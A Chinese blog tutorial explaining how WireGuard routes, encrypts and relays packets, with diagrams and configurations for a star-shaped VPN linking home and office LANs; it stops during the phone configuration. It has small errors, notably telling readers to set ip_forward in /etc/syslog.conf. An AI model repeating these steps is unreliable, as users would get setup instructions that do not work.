[{"categories":null,"content":"引言 本文详细分析了 WireGuard 的数据收发、数据中继的基本原理，并介绍了一种如何利用 WireGuard 快速构建一个属于自己的虚拟专用网络，可用于跨广域网安全通信，以及内网穿透。常见应用场景有：\n从公网安全访问家庭内网。例如：访问家庭摄像头，访问智能门锁，访问 NAS 服务器等。 从公网安全访问公司内网，满足远程办公需求。 “快速”二字主要体现在本文介绍的方法可以较大程度简化配置和管理，并允许线性扩展网络规模，且不倚赖第三方服务（例如 tailscale）。\n为什么选择 WireGuard 安全 WireGuard 的安全性经过形式化验证。 开源 WireGuard 完全开源，有 Go 和 C 语言两种实现。 跨平台 多平台支持，包括 Linux, Windows, macOS, Android, iOS 等。且内核模块已进入 Linux 内核树。 性能 快速，现代化，精简且实用。 方案介绍 本文介绍的方法是利用 WireGuard 搭建一个逻辑上的「星型」网络结构，如下图所示：\n╭─────────╮ ╭───────────╮ │ MacBook \u003c╌╌╌╌╌╌╌╌╌╌╌╮ ╭╌╌╌╌╌╌╌╌╌╌\u003e Cellphone │ ╰─10.9.9.1╯ ┆ ┆ ╰──╴10.9.9.2╯ ╭┬──v───v─┬╮☁️ ││ router ││ ╔═════════════════ office ══════╗ ╰┴10.9.0.1┴╯ ║ ╭─────────╮ ║ ^ ^ ║ ╭┬──────────┬╮ ╭─┤ jenkins │ ║ ╭╌╌╌╌╌╌╌╌╌╌╯ ╰╌╌╌╌╌╌╌╌╌\u003e─┤│ offic-gw │├──╯ ╰─────────╯ ║ ┆ ║ ╰┴╴10.9.0.3╶┴╯ ... ║ ┆ ║ ║ ┆ ╚═════════════╸172.19.50.0/24 ══╝ ╔════════════════════v═══════ homelab ═══╗ ║ ╭┬────┴────┬╮ ║ ║ ││ home-gw ││ ║ \u003c╌╌╌╌\u003e ║ ╰┴╴10.9.0.2┴╯ ║ ╭─╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌─╮ ║ ╭─────────────┼──────────────╮ ║ ┆ WireGuard Tunnel ┆ ║ ╭────┴───╮ ╭──────┴─────╮ ╭──┴──╮ ║ ╰─╌╌10.9.0.0/16╶╌╌─╯ ║ │ camera │ │ smart-lock │ ... │ NAS │ ║ ║ ╰────────╯ ╰────────────╯ ╰─────╯ ║ ╚══════════════════════ 192.168.1.0/24 ══╝ 设备说明 router 云端的一台服务器，有公网 IP，充当 tunnel 网络的路由器，提供路由中转服务。 home-gw 放在家里的一台服务器，充当家庭网络 (homelab) 的网关，通过该网关可以安全地穿透到家庭网络，访问家里的各种设备，例如：摄像头，智能门锁，NAS 服务器等。 office-gw 放在公司办公室的一台服务器，充当办公室网络 (office) 的网关,通过该网关可以安全地访问到公司内网的各项服务，满足远程办公需求。 MacBook 作为移动办公设备，位置不固定，可能在办公室、在家里，也可能处在咖啡厅、图书馆等外部网络。 Cellphone 手机，位置不固定，和 MacBook 类似。 网段划分 10.9.0.0/16 WireGuard tunnel 网段，是我们为 WireGuard 节点分配的网段（也可以改成你喜欢的任何局域网网段，只要不与现有的 LAN 网段冲突即可）。 其内部划分出如下网段：\n10.9.0.0/24: 分配给 router 和 gateway。 10.9.9.0/24: 分配给移动设备，包括 MacBook, Cellphone 等。 这样划分主要是为了便于区分不同类型的设备，同时也起到一个隔离保护的作用。\n192.168.1.0/24 家庭局域网私有网段，这里称为 homelab。 172.19.50.0/24 公司局域网私有网段，这里称为 office。 连通性说明 MacBook 和 Cellphone 可以访问所有网络，包括： office：满足移动办公需求。 homelab: 方便随时访问家庭网络中的各项设备。 office 和 homelab 之间默认无法互通，起到隐私安全方面的保护作用。 方案优缺点 方案优点：\n简化 WireGuard 的配置和管理\n只有二级节点（指直接与 router 相连的节点）需要与 router 互换公钥，二级节点之间无需互相了解，二级节点后面的所有设备也无需任何配置。这样可以最大程度简化 WireGuard 的配置和管理工作，同时允许以线性复杂度扩展接入 tunnel 的设备数量。\n扩展性强\n上面提到二级节点后面的设备无需任何配置，就能通过 WireGuard 网络访问。这点其实很重要，因为像摄像头、智能门锁等设备是无法进行这类配置的。该方案基本上允许我们无限扩展 WG 网络的可访问范围。\n安全、透明地访问内网资源\nMacBook/Cellphone 可以安全、透明地访问 homelab/office 的内网资源，被访问资源无需其他额外设置。\n方案缺点：\n设备之间的通信都需要经由中心的 router 服务器转发，可能存在单点故障和性能瓶颈。 作为个人用途而言，这个缺点一般是可以接受的。原因如下：\n私人网络一般数据量都比较小，不太可能出现性能瓶颈。 除非接入 WireGuard 的每台设备都有外网 IP，否则转发不可避免。 现在的云服务器还是相当稳定的，出故障的概率极低。要真碰上了，最差也就只是访问不了内网（跟没配置这个 tunnel 时一样），也不会有啥其他影响。 WireGuard 原理介绍 在方案实施之前，有必要先了解一下 WireGuard 的路由寻址、加解密通信原理，这对理解我们的方案有很大帮助。\n最简 WireGuard Tunnel 配置 为了方便讲解，我们先从一个最简单的 WireGuard Tunnel 配置开始。\n该 tunnel 仅包含 A, B 两个节点：\nPublic IP: 1.1.1.A 1.1.1.B ╭──────╮ ╭──────╮ │node A├───╴Internet ───┤node B│ ╰──────╯ ╰──────╯ WG IP: 10.0.0.A 10.0.0.B 其配置分别见下方。\nNode A 的配置清单：\n1 2 3 4 5 6 7 8 9 [Interface] Address = 10.0.0.A # A 是 1~254 之间的任意数字 PrivateKey = \u003cprivate key\u003e # Node B [Peer] PublicKey = \u003cB`s public key\u003e AllowedIPs = 10.0.0.B/32 Endpoint = 1.1.1.B:51820 # 假设 B 的公网 IP 为 1.1.1.B Node B 的配置清单：\n1 2 3 4 5 6 7 8 9 [Interface] Address = 10.0.0.B # B 是和 A 不相同的 1~254 之间的任意数字 PrivateKey = \u003cprivate key\u003e # Node A [Peer] PublicKey = \u003cA`s public key\u003e AllowedIPs = 10.0.0.A/32 # A 的 Endpoint 会在协议握手之后自动获取 WireGuard 数据发送 \u0026 接收流程（示意图） 按照上述最简配置，以 ping 命令为例，我画了一张 WireGuard 数据发送 \u0026 接收流程示意图：\nNode A Node B ╭───────╴user space╶────╮ │ ping 10.0.0.B │ ╰─────────┼─────────────╯ 1 ╭─────────v───kernel────╮ ╭───────────────kernel─────────────╮ │ ╭───────────────────╮ │ │ ╭──────────────────────────────╮ │ │ │ TCP/IP stack │ │ │ │ TCP/IP stack ╭────\u003e──╮ │ ╰──┬────^───────┬───╯ │ │ ╰──^──────────┬───^────┬────^──╯ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ ICMP UDP UDP │ │ UDP UDP ICMP Reply UDP │ │ │ 2 3 4 │ │ 5 6 7 8 9 │ 10 ╰─┬─╴v────┴─┬─┬───v────┬╯ ╰─┬──┴──────┬─┬─v───┴────v────┴───┬╯ │ │ wg0 │ │ eth0 │──────╮ ╭──\u003e eth0 │ │ wg0 │ │ ╰10.0.0.A─╯ ╰1.1.1.A─╯ │ │ ╰─1.1.1.B─╯ ╰──────10.0.0.B─────╯ │ ^ ICMP Req │ via eth0 │ (Encrypte in UDP) │ │ │ │ ╵ │ │ │ ╭─────UDP datagram─────╮ ╭─────UDP datagram─────╮ │ ╰────\u003e│ src: 1.1.1.A:xxxxx │ │ src: 1.1.1.B:51820 │ │ │ dst: 1.1.1.B:51820 │ │ dst: 1.1.1.A:xxxxx │ │ ╰─┬─────WG Header────┬─╯ ╰─┬─────WG Header────┬─╯ │ ╭╯ Received Index ╰╮ ╭╯ Received Index ╰╮ │ │ Counter │ │ Counter │ │ ├──────Encrypted─────┤ ├──────Encrypted─────┤ │ │ ╭─────ICMP────╮ │ │ ╭─╴ICMP Reply─╮ │ │ │ │src: 10.0.0.A│ │ │ │src: 10.0.0.B│ │ │ │ │dst: 10.0.0.B│ │ │ │dst: 10.0.0.A│ │ │ ╰──┴─────────────┴───╯ ╰──┴─────────────┴───╯ │ │ ╰───────────────────────ICMP Reply to A───────────────────────────╯ (Encrypted in UDP) 💡由于 ping 的响应由 kernel 的 TCP/IP stack 自动完成，因此上图中的 Node B 在 user space 并没有对应的用户空间处理程序。\n如果是普通的 TCP/UDP 应用，则会将数据丢给用户空间对应的处理程序，形成一个 Node A app ↔ Node B app 的完整闭环。\n下面，我们就按照上图标注的 1~7 个步骤，依次分析 WireGuard 的数据发送 \u0026 接收过程。\nWireGuard 数据发送流程 💡WireGuard 虽然是通过 UDP 来传输数据的，但其建立的网络隧道确是工作在 Layer 3 上的（通过创建虚拟网络接口来实现）。\n在 Node A 上执行命令 ping 10.0.0.B 时，会发生下面几件事情（大致对应 WireGuard 数据发送 \u0026 接收流程示意图 中的步骤 1~4）：\n应用层产生报文\n在 node A 上执行 ping 10.0.0.B 命令 应用层交给内核协议栈生成一个 ICMP 报文 1 2 [Inner IP Header] # 源=10.0.0.A，目的=10.0.0.B [ICMP Echo Request] 路由查找\n内核查路由表，发现 packet 的目标地址 10.0.0.B 应该由 WireGuard 接口 wg0 处理。\n💡在配置文件中的 AllowedIPs 中声明的地址，都会自动加入到对应 WireGuard 接口的路由表项中。可以通过 ip route 命令可以很轻松的验证这一点。\n内核将该 packet 交给 wg0 处理。\nWireGuard 接口处理（出站方向）\n确定目标 Peer: WireGuard 内核模块查找 AllowedIPs，找到 10.0.0.B 属于Peer B。\n加密：\n取出会话密钥 (session key) —— 该密钥由 WG 协议握手协商得来\n使用 ChaCha20-Poly1305 将整个原始 IP packet 加密\n加上 WG Data Header, 包含如下信息：\nReceiver Index (32bit, 标识接受方的会话） Counter (64bit, 防重放计数） 将 WG Data Header 和加密后的数据放到一个 UDP 包中：\n1 2 3 4 [Outer IP Header] # 源 = A 公网地址，目的 = B 公网地址（Endpoint 指定） [UDP Header] # 源端口=随机/固定，目的端口=51820 (Endpoint 指定) [WG Data Header] # Receiver Index, Counter [Encrypted Payload] # 原始 IP 报文 (10.0.0.A → 10.0.0.B) UDP 发送\n内核把这个 UDP packet 交给物理网卡，发送到 Internet → node B 。\n从上述过程中可以看到， 在发送数据的过程中，AllowedIPs 起到类似路由表 (routing table) 的作用 。\nWireGuard 数据接收流程 下面是 node B 接收数据的过程（大致对应 WireGuard 数据发送 \u0026 接收流程示意图 中的步骤 5~7）：\n到达网卡 外层 UDP packet 到达 node B 的 WireGuard 监听端口（这里是 51820）。 内核网络栈把该 packet 交给 wg0 接口对应的 WireGuard 内核模块。 WireGuard 接口处理（入站方向） 定位会话\nWireGuard 内核模块读取 Receiver Index 根据这个 index 查找本地存储的会话信息 (session key, peer)。 如果找不到 → 丢弃。 防重放校验\n使用 Counter 和本地的滑动窗口机制检查： 这个包是不是比上一次的序号小？ 是否落在防重放窗口内？ 未通过检查 → 丢弃 解密\n使用找到的 session key 解密并校验完整性\n解密失败 → 丢弃\n校验原始 packet 的源 IP 地址\n解密后得到的就是原始的 IP packet, 例如：\n1 2 [Inner IP Header] # 源=10.0.0.A，目的=10.0.0.B [ICMP Echo Request] 检查原始 IP packet 的源地址是否在该 Peer 的 AllowedIPs 配置范围内：\n✅ 如果匹配 → 把原始报文交给 wg0 虚拟网卡 → 内核继续处理。\n❌ 如果不匹配 → 直接丢弃。\n报文处理 内核查找路由表，发现目的 IP 10.0.0.B 是 B 自己 (wg0 配置的隧道内 IP)\n💡如果发现目的 IP 不是 B 自己呢？读者可以思考一下。本节先留点悬念，后文章节 WireGuard 数据中继原理 中会详细讲解。\n内核将该 packet 交给本地协议栈（ICMP handler, TCP socket 等）。\n从上述过程中可以看到， 在接收数据的过程中，AllowedIPs 起到类似 ACL (Access Control List) 的作用 。\nNode B 的内核协议栈在收到 ping 后，向 Node A 发送响应 (ICMP Echo Rely) 的过程，其实就是上述步骤的逆向过程（对应图中的 8~10）：\n协议栈发现是发给本机的 ICMP Echo Request:\n生成一个 ICMP Echo Reply。 内核查路由表，发现 Reply packet 应该交给 wg0 处理。 WireGuard 查找 AllowedIPs, 找到 peer A 可以接收这个 ICMP Echo Reply，于是用 peer A 的 session key 加密 packet, 并封装到 UDP 包中（该 UDP 包的目的地址为 peer A 的公网 IP 地址 10.0.0.A ），交给内核协议栈。\n内核查路由表，然后通过物理网卡 eth0 将该 UDP 包发送给 node A。\nnode A 收到 UDP 包后，按照同样的流程，将其交给监听该端口的程序 (WireGuard) → 找到 session key → 解密 → 交给内核协议栈 → 最终交给上层的 ping 应用 → 打印 ICMP Echo Reply 消息。\nWireGuard 数据中继原理 前文提到，当 WireGuard 解出内层的原始 IP 报文，并交给内核处理，此时如果内核发现目的 IP 不是本机，会如何处理？\n很简单，Linux 内核只有两种处理方式：\n系统已打开 ip_forward 查找路由表，尝试转发。 系统未打开 ip_forward 直接丢弃。 WireGuard 的数据中继功能就是以此为基础的。\n因此，本章有个前提，就是用作中继节点的 WireGuard 服务器已经打开了 ip_forward 。具体打开方式，可参考后文 打开 IP 转发 中的介绍。\nWireGuard 数据中继（配置清单） 现在咱们在 最简 WireGuard Tunnel 配置 基础上，增加了一个 node C：\nPublic IP: 1.1.1.A 1.1.1.B 1.1.1.C ╭──────╮ ╭──────╮ ╭──────╮ │node A├────┤node B├────┤node C│ ╰──────╯ ╰──────╯ ╰──────╯ WG IP: 10.0.0.A 10.0.0.B 10.0.0.C 这次需要在 node A 上，运行 ping 10.0.0.C 。\n要满足这个需求，需要修改一下 WireGuard 配置文件。\nNode A 的配置清单\nA 需要向 C 发消息，所以在 Peer B 处的 AllowedIPs 应该填 C 的 IP，而不是 B 的 IP。 B 只起到一个路由转发的作用。\n1 2 3 4 5 6 7 8 9 10 # A's wg0.conf [Interface] Address = 10.0.0.A/32 PrivateKey = \u003cprivate key\u003e # B [Peer] PublicKey = \u003cB`s public key\u003e AllowedIPs = 10.0.0.C/32 # A \\leftrightarrow C Endpoint = 1.1.1.B:51820 # 假设 B 的公网 IP 为 1.1.1.B Node B 的配置清单\nB 作为中继节点，需要同时配置 peer A 和 peer C。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # B's wg0.conf [Interface] Address = 10.0.0.B/32 PrivateKey = \u003cprivate key\u003e # node A [Peer] PublicKey = A`s public key AllowedIPs = 10.0.0.A/32 # node C [Peer] PublicKey = C`s public key AllowedIPs = 10.0.0.C/32 Node C 的配置清单\n同样的，C 需要允许 A 向我发消息，所以在 Peer B 处的 AllowedIPs 应该填 A 的 IP，而不是 B 的 IP。B 只起到一个路由转发的作用。\n1 2 3 4 5 6 7 8 9 10 # C's wg0.conf [Interface] Address = 10.0.0.C/32 PrivateKey = \u003cprivate key\u003e # B [Peer] PublicKey = \u003cB`s public key\u003e AllowedIPs = 10.0.0.A/32 # A \\leftrightarrow C Endpoint = 1.1.1.B:51820 # 假设 B 的公网 IP 为 1.1.1.B WireGuard 数据中继（示意图） 还是以 ping 命令为例，下面是我画的 WireGuard 数据中继的流程示意图：\nNode A Node B Node C (ip_forward=1) ╭───────╴user space╶────╮ Relay Node Target Node │ ping 10.0.0.B │ ╰─────────┼─────────────╯ 1 ╭─────────v───kernel────╮ ╭───────────────kernel─────────────╮ ╭───────────────kernel─────────────╮ │ ╭───────────────────╮ │ │ ╭──────────────────────────────╮ │ │ ╭──────────────────────────────╮ │ │ │ TCP/IP stack │ │ │ │ TCP/IP stack ╭────\u003e──╮ │ │ TCP/IP stack ╭────\u003e──╮ │ ╰──┬────^───────┬───╯ │ │ ╰──^──────────┬───^────┬────^──╯ │ │ │ ╰──^──────────┬───^────┬────^──╯ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ ICMP UDP UDP │ │ UDP UDP ICMP ICMP UDP │ │ │ UDP UDP ICMP Reply UDP │ │ │ 2 3 4 │ │ 5 6 7 8 9 │ 10 │ 11 12 13 14 15 │ 16 ╰─┬─╴v────┴─┬─┬───v────┬╯ ╰─┬──┴──────┬─┬─v───┴────v────┴───┬╯ │ ╰─┬──┴──────┬─┬─v───┴────v────┴───┬╯ │ │ wg0 │ │ eth0 │────────╮ │ eth0 │ │ wg0 │ │ ╭────────\u003e eth0 │ │ wg0 │ │ ╰10.0.0.A─╯ ╰1.1.1.A─╯ │ ╰─1.1.1.B─╯ ╰──────10.0.0.B─────╯ │ │ ╰─1.1.1.C─╯ ╰──────10.0.0.C─────╯ │ ^ ICMP Echo Req ^ via eth0 │ via eth0 │ (Encrypted in UDP) │ │ │ │ │ │ │ │ │ │ ╵ │ ╭─────UDP datagram─────╮ ╭─────UDP datagram─────╮ ╭─────UDP datagram─────╮ │ Got ICMP Echo Reply! ╰───\u003e│ src: 1.1.1.A:xxxxx │ │ src: 1.1.1.B:51820 │ │ src: 1.1.1.C:51820 │\u003c───────╯ (Encrypted in UDP) │ dst: 1.1.1.B:51820 │ │ dst: 1.1.1.C:xxxxx │ │ dst: 1.1.1.B:xxxxx │ ╷ ╰─┬─────WG Header────┬─╯ ╰─┬─────WG Header────┬─╯ ╰─┬─────WG Header────┬─╯ │ ╭╯ Received Index ╰╮ ╭╯ Received Index ╰╮ ╭╯ Received Index ╰╮ │ │ Counter │ │ Counter │ │ Counter │ ╭─────UDP datagram─────╮ ├──────Encrypted─────┤ ├──────Encrypted─────┤ ├──────Encrypted─────┤ │ src: 1.1.1.B:51820 │ │ ╭─────ICMP────╮ │ │ ╭─────ICMP────╮ │ │ ╭─ICMP Reply──╮ │ │ dst: 1.1.1.A:xxxxx │ │ │src: 10.0.0.A│ │ │ │src: 10.0.0.A│ │ │ │src: 10.0.0.C│ │ ╰─┬─────WG Header────┬─╯ │ │dst: 10.0.0.C│ │ │ │dst: 10.0.0.C│ │ │ │dst: 10.0.0.A│ │ ╭╯ Received Index ╰╮ ╰──┴─────────────┴───╯ ╰──┴─────────────┴───╯ ╰──┴─────────────┴───╯ │ Counter │ ╭──────────╮ │ ├──────Encrypted─────┤ ╭───────wg0────┴─╮ Node B │ │ │ ╭──ICMP Reply─╮ │\u003c──────via eth0────╴│Encrypt into UDP│ \u003c──────────────────────────────╯ │ │src: 10.0.0.C│ │ ╭──┴──ICMP Reply─╮ ├────────╯ │ │dst: 10.0.0.A│ │ │src: 10.0.0.C │──╯ ╰──┴─────────────┴───╯ │dst: 10.0.0.A │ ╰────────────────╯ 和前面的 WireGuard 数据发送 \u0026 接收示意图 相比较，可以看到，前面的 7 个步骤是完全一致的。区别从第 8 步开始：\n进入数据转发流程\n内核收到 WireGuard 解密后的 ICMP 包之后，发现这个包不是发给本机的，于是进入转发流程（前提是打开了 ip_forward）。\n首先仍然是内核查找路由表：\n发现目的 IP 10.0.0.C 应该由 wg0 处理 继续交给 wg0 负责发送该 ICMP 包 WireGuard 接口处理（出站方向）\n到这一步之后，就和 WireGuard 数据发送流程 中的出站数据处理一致了：\n确定目标 peer C\n重新用 peer C 的 session key 加密\n封装 WG Data Header → 封装 UDP 包，UDP 的目标地址为 1.1.1.C 。\nUDP 包发送至 node C。\n💡请注意，WireGuard 在转发内层 IP 报文时，内层报文会 原封不动 地传递，包括：\n不会修改源地址 不会修改目标地址 不做 NAT WireGuard 唯一会做的就是：\n接收方向 确认解密后的源 IP 属于该 peer 的 AllowedIPs, 否则丢弃 （类似 ACL 的作用）。 发送方向 根据目的 IP 查找匹配的 AllowedIPs, 把数据交给对应的 peer, 加密后发出去（类似 routing table 的作用）。 除此之外，它不会对内层 IP 报文做任何修改。\n因此，node C 收到的内层报文，仍然是原始的 10.0.0.A → 10.0.0.C 的 ping 报文。\n而 node C 之后的步骤，就是一个逆向返回的过程，这里就不再赘述。\nWireGuard 内网网关（配置清单） 有了对 WireGuard 数据中继原理的理解，就可以轻松理解 WireGuard 内网网关 (home-gw, office-gw) 是如何工作的了。\n╭────LAN: 192.168.1.0/24──────╮ │ Gateway │ │ 192.168.1.B 192.168.1.C │ ╭1.1.1.A─╮ │ ╭1.1.1.B╶╮ ╭────────╮ │ │ node A ├──┼──┤ node B ├──────┤ node C │ │ ╰────────╯ │ ╰────────╯ ╰────────╯ │ 10.0.0.A │ 10.0.0.B │ ╰─────────────────────────────╯ 请注意，这次的网络拓扑结构和之前的有所不同：\nNode B 和 node C 处在同一个 LAN 中。 Node C 不是 WireGuard 节点，并没有加入 WG tunnel。 我们还是先给出配置清单。\nNode A 的配置清单\nA 需要向 C 发消息，所以在 Peer B 处的 AllowedIPs 应该填 C 的 IP，而不是 B 的 IP。 B 只起到一个路由转发的作用。\n1 2 3 4 5 6 7 8 9 10 # A's wg0.conf [Interface] Address = 10.0.0.A/32 PrivateKey = \u003cprivate key\u003e # B [Peer] PublicKey = \u003cB`s public key\u003e AllowedIPs = 192.168.1.C # A \\leftrightarrow C Endpoint = 1.1.1.B:51820 # 假设 B 的公网 IP 为 1.1.1.B Node B 的配置清单\nB 作为 gateway，仅需配置 peer A （peer B 不加入 WG tunnel)。\n1 2 3 4 5 6 7 8 9 10 11 12 # B's wg0.conf [Interface] Address = 10.0.0.B/32 PrivateKey = \u003cprivate key\u003e # eth0 为物理网卡地址，如有不同请自行修改。 PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE # node A [Peer] PublicKey = A`s public key AllowedIPs = 10.0.0.A/32 注意，相比之前的配置，Node B 增加了 PostUp 和 PostDown 配置。这两项配置分别会在 wg0 接口启用、停用之后执行。也就是说：\nwg0 接口启动后： iptables 增加一条转发规则，允许将来自 wg0 的包转发给 eth0，并执行 NAT 操作。 wg0 接口停止后： iptables 删除上述规则。 如果没有这两条配置，Node B 就不能将数据转发给 LAN 网络。\nWireGuard 内网网关（示意图） 还是以 ping 命令为例，但这次换成：\n1 ping 192.168.1.C 这要求将 ICMP 包穿透到内网中的非 WireGuard 设备上。\n下面是我画的内网穿透示意图。\n╭╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌LAN: 192.168.1.0/24╶╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╮ Node A ┆ Node B Node C ┆ ┆ (ip_forward=1) ┆ ╭───────╴user space╶────╮ ┆ LAN IP: 192.168.1.B LAN IP: 192.168.1.C ┆ │ ping 192.168.1.C │ ┆ Gateway Node Target Node ┆ ╰─────────┼─────────────╯ ┆ ┆ 1 ┆ ┆ ╭─────────v───kernel────╮ ┆ ╭──────────kernel─────────╮ ╭────────kernel╶───────╮ ┆ │ ╭───────────────────╮ │ ╰╌╌╌╴│ ╭─────────────────────╮ │ │ ╭──────────────────╮ │╶╌╌╯ │ │ TCP/IP stack │ │ │ │ TCP/IP stack ╭─────\u003e─────╮ │ │ TCP/IP stack ╶─\u003e──╮ │ ╰──┬────^───────┬───╯ │ │ ╰──^──────────┬───^───╯ │ │ │ ╰──^───────────────╯ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ ICMP UDP UDP │ │ UDP UDP ICMP │ │ │ ICMP │ │ │ 2 3 4 │ │ 5 6 7 │ 8 │ 9 │ 10 ╰─┬─╴v────┴─┬─┬───v────┬╯ ╰─┬──┴──────┬─┬─v───┴────┬╯ │ ╰─┬──┴────── ───┬──────╯ │ │ wg0 │ │ eth0 │────────╮ │ eth0 │ │ wg0 │ ╭────SNAT──────╮ ╭─via eth0────────\u003e eth0 │ │ ╰10.0.0.A─╯ ╰1.1.1.A─╯ │ ╰─1.1.1.B─╯ ╰─10.0.0.B─╯ │╭─╴10.0.0.A │ │ ╰─192.168.1.C─╯ │ ^ ICMP Echo Req ^ │╰─\u003e192.168.1.B│ │ via eth0 │ (Encrypted in UDP) │ ╰───┬──────────╯ │ │ │ │ │ │ │ │ ╵ │ ╭─────UDP datagram─────╮ ╭──╴ICMP packet╶──╮ │ Got ICMP Echo Reply ╰───╴│ src: 1.1.1.A:xxxxx │ │src: 192.168.1.B │ │ (Encrypted in UDP) │ dst: 1.1.1.B:51820 │ │dst: 192.168.1.C │ │ ╷ ╰─┬─────WG Header────┬─╯ ╰─────────────────╯ │ │ ╭╯ Received Index ╰╮ ╭──╴ICMP Reply────╮ │ │ │ Counter │ │src: 192.168.1.C │\u003c──────────────╯ ╭──────UDP datagram─────╮ ├──────Encrypted─────┤ │dst: 192.168.1.B │ │ src: 1.1.1.B:51820 │ │ ╭─────ICMP───────╮ │ ╰─────────────────╯ │ dst: 1.1.1.A:xxxxx │ │ │src: 10.0.0.A │ │ │ ╰──┬─────WG Header────┬─╯ │ │dst: 192.168.1.C│ │ │ ╭─╯ Received Index ╰╮ ╰─┴────────────────┴─╯ ╭─────────╮ │ │ Counter │ ╭──────DNAT─────┴╮ Node B │ │ ├───────Encrypted─────┤ ╭───────wg0─────┴╮ ╭─╴192.168.1.B│ \u003c─────11─────╯ │ ╭─────ICMP───────╮ │\u003c────via eth0─────╴│Encrypt into UDP│ ╰─\u003e10.0.0.A ├────────╯ │ │src: 192.168.1.C│ │ ╭──┴──ICMP Reply─╮ ├───────────────╯ │ │dst: 10.0.0.A │ │ │src: 192.168.1.C│──╯ ╰──┴────────────────┴─╯ │dst: 10.0.0.A │ ╰────────────────╯ 和 WireGuard 数据中继（示意图） 做对比，可以看到前面 7 个步骤都是一致的，从步骤 8 开始有区别：\n进入数据转发流程\n内核收到 WireGuard 解密后的 ICMP 包之后，发现这个包不是发给本机的，于是进入转发流程（前提是打开了 ip_forward）。\n首先仍然是内核查找路由表：\n发现目的 IP 192.168.1.C 应该由 eth0 发送 发送前需要做 SNAT, 将源地址从 10.0.0.A 转换为本机的 LAN 地址 192.168.1.B 再通过 eth0 接口发送给 node C Node C 收到 ICMP 包后，内核协议栈按照正常流程生成 ICMP Echo Reply。\nICMP Echo Reply 经由 eth0 发往 node B。\nNode B 收到 Reply, 需要先做 DNAT 将目的地址转换回 10.0.0.A, 后续步骤就和 WireGuard 数据中继的流程一致了。\n方案实施 有了上述理论基础，要实现文章开头的 WireGuard 星型拓扑结构就很简单了。\nWireGuard 在不同平台上的安装都比较简单，网上也很多相关介绍，这里略去不提，直接给出各个节点的配置说明。\nWireGuard 的配置文件如果没有特殊说明，路径统一为 /etc/wireguard/wg0.conf 。 macOS 和 iOS/Android 比较特殊，有 UI 界面可以直接配置（Windows 没用过，想必应该也有界面可以配置）。\nrouter 配置 打开 IP 转发 修改 /etc/syslog.conf 文件，增加如下内容： 1 net.ipv4.ip_forward = 1 运行命令： 1 sysctl -p 💡为何要为 router 打开 IP 转发？\n如果不打开 IP 转发，服务器在发现目标地址不属于自己的 packet 时，会直接丢弃。\n而我们的 router 服务器作为“星型”网络的中心节点，需要为所有的下级节点将数据转发给其他各个节点，起到中继的作用，所以必须打开这个功能。\nWireGuard 配置 router wg0.conf 配置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [Interface] Address = 10.9.0.1/32 PrivateKey = \u003cprivate key\u003e # home-gw [Peer] PublicKey = xxx # home-gw's public key # 在发送报文时，请将目标地址符合 AllowedIPs 配置的报文，发给此 Peer # 在收到报文时，允许接收源地址符合 AllowedIPs 配置的报文 AllowedIPs = 10.9.0.2/32, 192.168.1.0/24 # 允许将报文转发给 homelab 网络 # office-gw [Peer] PublicKey = xxx # office-gw's public key AllowedIPs = 10.9.0.3/32, 172.19.50.0/24 # 允许将报文转发给 office 网络 # MacBook [Peer] PublicKey = xxx # MacBook's public key AllowedIPs = 10.9.9.1/32 # Cellphone [Peer] PublicKey = xxx # Cellphone's public key AllowedIPs = 10.9.9.2/32 home-gw 配置 打开 IP 转发 参考前面的方法打开 IP 转发功能。\n💡为何要为 home-gw 打开 IP 转发？\n我们的 home-gw 服务器作为 homelab 网络的网关设备，需要为 homelab 网络中的其他所有设备提供网络穿透和数据转发服务，所以必须打开这个功能。\nWireGuard 配置 home-gw wg0.conf 配置：\n1 2 3 4 5 6 7 8 9 10 11 12 [Interface] Address = 10.9.0.2/32 PrivateKey = \u003cprivate key\u003e # 将目标地址不是本机的数据包通过物理网卡 eth0 转发出去，同时做一个地址伪装 (SNAT) # 如果你的物理网卡不是 eth0，请修改成实际物理网卡接口 PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE # router [Peer] PublicKey = xxx # router's public key AllowedIPs = 10.9.9.0/24 # 和移动端设备（MacBook/Cellphone）互通 office-gw 配置 打开 IP 转发 参考前面的方法打开 IP 转发功能。原因和前面说的为 home-gw 打开 IP 转发的原因一致。\nWireGuard 配置 office-gw wg0.conf 配置：\n1 2 3 4 5 6 7 8 9 10 11 12 [Interface] Address = 10.9.0.3/32 PrivateKey = \u003cprivate key\u003e # 将目标地址不是本机的数据包通过物理网卡 eth0 转发出去，同时做一个地址伪装 (SNAT) # 如果你的物理网卡不是 eth0，请修改成实际物理网卡接口 PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE # router [Peer] PublicKey = xxx # router's public key AllowedIPs = 10.9.9.0/24 # 和移动端设备（MacBook/Cellphone）互通 MacBook 配置 MacBook WireGuard 配置：\n1 2 3 4 5 6 7 8 [Interface] Address = 10.9.9.1/32 PrivateKey = \u003cprivate key\u003e # router [Peer] PublicKey = xxx # router's public key AllowedIPs = 10.9.0.0/16, 192.168.1.0/24, 172.19.50.0/24 # 和所有设备互通 Cellphone 配置 Cellphone WireGuard 配置和 MacBook 配置类似：\n1 2 3 4 5 6 7 8 [Interface] Address = 10.9.9.2/32 PrivateKey = \u003cprivate key\u003e # router [Peer] PublicKey = xxx # router's public key 